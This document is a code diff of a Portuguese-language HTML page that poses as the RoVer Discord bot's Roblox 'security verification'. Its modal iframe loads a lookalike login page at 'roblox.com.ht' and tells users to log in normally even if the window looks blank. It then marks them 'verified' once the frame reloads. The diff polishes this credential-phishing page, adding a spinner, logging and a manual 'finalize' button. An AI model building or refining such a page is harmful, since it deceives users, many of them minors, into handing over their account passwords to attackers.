@@ -22,7 +22,6 @@
     .menu { display: flex; gap: 12px; flex-wrap: wrap; font-size: 0.9rem; }
     .menu a { color: white; text-decoration: none; }
     .user-info { display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
-    .avatar { width: 28px; height: 28px; border-radius: 50%; background: #333; }
     main {
       display: flex; flex-direction: column; align-items: center; justify-content: center;
       min-height: calc(100vh - 60px); text-align: center; padding: 15px;
@@ -32,8 +31,13 @@
     p { color: #aaaaaa; margin-bottom: 30px; font-size: clamp(1rem, 4vw, 1.2rem); }
     .buttons { display: flex; justify-content: center; gap: 12px; margin-bottom: 30px; flex-wrap: wrap; }
     .btn-primary, .btn-secondary {
-      padding: 12px 35px; border-radius: 8px; font-size: clamp(1rem, 4vw, 1.2rem);
-      cursor: pointer; transition: 0.3s;
+      padding: 12px 35px; border-radius: 8px;
+      font-size: clamp(1rem, 4vw, 1.2rem);
+      cursor: pointer; transition: 0.2s;
+    }
+    /* 🟢 Botão cresce levemente ao clicar */
+    .btn-primary:active {
+      transform: scale(1.05);
     }
     .btn-primary { background: #ff3399; color: white; border: none; }
     .btn-primary:hover { background: #ff5ab3; }
@@ -41,155 +45,228 @@
     .extra-link { color: #ff3399; text-decoration: none; font-size: 1rem; }
     .initial-content { display: block; }
     .success-content { display: none; color: #00ff9d; font-size: 2rem; font-weight: 500; text-align: center; }
+
     .modal {
       display: none; position: fixed; inset: 0;
-      background: rgba(0,0,0,0.95); align-items: center; justify-content: center;
+      background: rgba(0,0,0,0.95);
+      align-items: center; justify-content: center;
       z-index: 1000; padding: 10px;
     }
     .modal.open { display: flex; }
+
     .modal-content {
-      width: 100%; max-width: 900px; height: 90vh; max-height: 95vh;
-      background: #1e1e1e; border-radius: 12px; padding: 15px; position: relative;
-      overflow: hidden; box-shadow: 0 0 30px rgba(255,51,153,0.3);
+      width: 100%; max-width: 900px; height: 90vh;
+      background: #1e1e1e;
+      border-radius: 12px;
+      padding: 15px;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 30px rgba(255,51,153,0.3);
     }
+
     .close-btn {
-      position: absolute; top: 10px; right: 15px; background: none; border: none;
-      color: #fff; font-size: 2.5rem; cursor: pointer; z-index: 10;
+      position: absolute; top: 10px; right: 15px;
+      background: none; border: none;
+      color: #fff; font-size: 2.5rem;
+      cursor: pointer; z-index: 10;
     }
+
     .verification-container {
-      width: 100%; height: 100%; position: relative; border-radius: 8px;
-      overflow: hidden; border: 1px solid #444; background: #000;
+      width: 100%; height: 100%;
+      position: relative;
+      border-radius: 8px;
+      overflow: hidden;
+      border: 1px solid #444;
+      background: #000;
     }
+
     .loading-screen {
-      position: absolute; inset: 0; background: #1e1e1e;
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      color: #ffffff; font-size: 1.4rem; text-align: center; padding: 20px; z-index: 5;
+      position: absolute; inset: 0;
+      background: #1e1e1e;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-size: 1.4rem;
+      text-align: center;
+      padding: 20px;
+      z-index: 5;
+
+      /* 🟢 Cursor lock enquanto loading */
+      cursor: not-allowed;
     }
+
+    /* 🟢 Spinner estilo cobrinha girando */
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top-color: #ff3399;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* 🟢 Dots animados */
+    .loading-dots::after {
+      content: "";
+      animation: dots 1.5s steps(3, end) infinite;
+    }
+
+    @keyframes dots {
+      0% { content: ""; }
+      33% { content: "."; }
+      66% { content: ".."; }
+      100% { content: "..."; }
+    }
+
     iframe {
-      width: 100%; height: 100%; border: none; background: #000;
-      display: none; /* começa escondido */
+      width: 100%; height: 100%;
+      border: none;
+      background: #000;
+      display: none;
     }
+
     .confirm-area {
-      margin-top: 30px; display: none;
-    }
-    @media (max-width: 768px) {
-      header { padding: 10px; }
-      .modal-content { height: 95vh; border-radius: 0; padding: 10px; }
-      .close-btn { font-size: 2.2rem; top: 8px; right: 12px; }
-      .buttons { flex-direction: column; gap: 10px; }
+      margin-top: 25px;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <header>
-    <div class="logo">RoVer</div>
-    <div class="menu">
-      <a href="#">Help</a>
-      <a href="#">Team Members</a>
-      <a href="#">Manage Servers</a>
-      <a href="#">Verification</a>
-    </div>
-    <div class="user-info">
-      <span>version: 1.37</span>
-    </div>
-  </header>
-  <main>
-    <div class="content">
-      <div class="initial-content" id="initial-content">
-        <h1>Você ainda não está verificado</h1>
-        <p>Para acessar recursos exclusivos, complete a verificação de segurança Roblox.</p>
-        <div class="buttons">
-          <button class="btn-primary" id="start-verification">Iniciar Verificação</button>
-          <button class="btn-secondary">Cancelar</button>
-        </div>
-        <a href="#" class="extra-link">Precisa de ajuda com a verificação? →</a>
-      </div>
-      <div class="success-content" id="success-content">
-        <h1>Verificação concluída!</h1>
-        <p>Agora você tem acesso total ao servidor</p>
-      </div>
-    </div>
-  </main>
 
-  <div class="modal" id="verification-modal">
-    <div class="modal-content">
-      <button class="close-btn" id="close-modal">×</button>
-      <div class="verification-container">
-        <div class="loading-screen" id="loading">
-          <div>Preparando verificação<span class="loading-dots"></span></div>
-          <p style="margin: 20px 0; font-size: 1.1rem; color: #aaa;">
-            <strong>Atenção:</strong> O Roblox bloqueia a exibição da página de login dentro desta janela por segurança.<br>
-            A tela pode ficar branca/cinza. Continue com o login normalmente.
-          </p>
-          <div class="confirm-area" id="confirm-area">
-            <button class="btn-primary" id="confirm-verified">Já fiz o login → Finalizar</button>
-          </div>
-        </div>
-        <iframe id="verify-iframe" src="about:blank" allowfullscreen></iframe>
+<header>
+  <div class="logo">RoVer</div>
+  <div class="menu">
+    <a href="#">Help</a>
+    <a href="#">Team Members</a>
+    <a href="#">Manage Servers</a>
+    <a href="#">Verification</a>
+  </div>
+  <div class="user-info">
+    <span>version: 1.37</span>
+  </div>
+</header>
+
+<main>
+  <div class="content">
+    <div class="initial-content" id="initial-content">
+      <h1>Você ainda não está verificado</h1>
+      <p>Para acessar recursos exclusivos, complete a verificação de segurança Roblox.</p>
+      <div class="buttons">
+        <button class="btn-primary" id="start-verification">Iniciar Verificação</button>
+        <button class="btn-secondary">Cancelar</button>
       </div>
+      <a href="#" class="extra-link">Precisa de ajuda com a verificação? →</a>
+    </div>
+
+    <div class="success-content" id="success-content">
+      <h1>Verificação concluída!</h1>
+      <p>Agora você tem acesso total ao servidor</p>
     </div>
   </div>
+</main>
 
-  <script>
-    const modal = document.getElementById('verification-modal');
-    const initial = document.getElementById('initial-content');
-    const success = document.getElementById('success-content');
-    const startBtn = document.getElementById('start-verification');
-    const closeBtn = document.getElementById('close-modal');
-    const loading = document.getElementById('loading');
-    const iframe = document.getElementById('verify-iframe');
-    const confirmArea = document.getElementById('confirm-area');
-    const confirmBtn = document.getElementById('confirm-verified');
+<div class="modal" id="verification-modal">
+  <div class="modal-content">
+    <button class="close-btn" id="close-modal">×</button>
+    <div class="verification-container">
+      <div class="loading-screen" id="loading">
+        <div class="spinner"></div>
+        <div>Preparando verificação<span class="loading-dots"></span></div>
+        <p style="margin-top: 20px; font-size: 1.05rem; color: #aaa;">
+          O Roblox pode bloquear a exibição aqui. Continue normalmente.
+        </p>
+        <div class="confirm-area" id="confirm-area">
+          <button class="btn-primary" id="confirm-verified">
+            Travou? Finalizar manualmente →
+          </button>
+        </div>
+      </div>
+      <iframe id="verify-iframe" src="about:blank"></iframe>
+    </div>
+  </div>
+</div>
 
-    const IFRAME_URL = "https://www.roblox.com.ht/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F284842315664%2Fprofile"; // ou seu teste
+<script>
+  const modal = document.getElementById('verification-modal');
+  const initial = document.getElementById('initial-content');
+  const success = document.getElementById('success-content');
+  const startBtn = document.getElementById('start-verification');
+  const closeBtn = document.getElementById('close-modal');
+  const loading = document.getElementById('loading');
+  const iframe = document.getElementById('verify-iframe');
+  const confirmArea = document.getElementById('confirm-area');
+  const confirmBtn = document.getElementById('confirm-verified');
 
-    let isFirstLoad = true;
+  const IFRAME_URL = "https://www.roblox.com.ht/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F284842315664%2Fprofile";
 
-    function completeVerification() {
-      modal.classList.remove('open');
-      initial.style.display = 'none';
-      success.style.display = 'block';
+  let isFirstLoad = true;
+
+  function log(state) {
+    console.log("[VERIFICATION]", state);
+  }
+
+  function completeVerification() {
+    log("verified");
+    modal.classList.remove('open');
+    initial.style.display = 'none';
+    success.style.display = 'block';
+  }
+
+  function closeModal() {
+    log("modal_closed");
+    modal.classList.remove('open');
+    iframe.src = "about:blank";
+    confirmArea.style.display = 'none';
+  }
+
+  startBtn.onclick = () => {
+    log("started");
+    isFirstLoad = true;
+    modal.classList.add('open');
+
+    loading.style.display = 'flex';
+    iframe.style.display = 'none';
+    confirmArea.style.display = 'none';
+
+    iframe.src = IFRAME_URL;
+
+    setTimeout(() => {
+      log("iframe_shown");
+      loading.style.display = 'none';
+      iframe.style.display = 'block';
+      confirmArea.style.display = 'block';
+    }, 2600);
+  };
+
+  confirmBtn.onclick = () => {
+    log("manual_confirm");
+    setTimeout(completeVerification, 800);
+  };
+
+  iframe.addEventListener('load', () => {
+    if (isFirstLoad) {
+      isFirstLoad = false;
+      log("iframe_first_load");
+      return;
     }
 
-    function closeModal() {
-      modal.classList.remove('open');
-      iframe.src = "about:blank";
-      confirmArea.style.display = 'none';
-    }
+    log("iframe_loaded_again");
+    loading.style.display = 'flex';
+    iframe.style.display = 'none';
 
-    startBtn.onclick = () => {
-      isFirstLoad = true;
-      modal.classList.add('open');
-      loading.style.display = 'flex';
-      iframe.style.display = 'none';
-      confirmArea.style.display = 'none';
+    setTimeout(completeVerification, 2800);
+  });
 
-      iframe.src = IFRAME_URL;
+  closeBtn.onclick = closeModal;
+  modal.onclick = (e) => { if (e.target === modal) closeModal(); };
+</script>
 
-      setTimeout(() => {
-        loading.style.display = 'none';
-        iframe.style.display = 'block';
-        confirmArea.style.display = 'block'; // Mostra botão manual
-      }, 2500);
-    };
-
-    confirmBtn.onclick = completeVerification;
-
-    iframe.addEventListener('load', () => {
-      if (isFirstLoad) {
-        isFirstLoad = false;
-        return;
-      }
-      // Tentativa de detecção (pode falhar, mas não quebra nada)
-      try {
-        if (iframe.contentWindow.location.href.toLowerCase().includes("roblox.com")) {
-          setTimeout(completeVerification, 3000);
-        }
-      } catch {}
-    });
-
-    closeBtn.onclick = closeModal;
-    modal.onclick = (e) => { if (e.target === modal) closeModal(); };
-  </script>
 </body>
 </html>
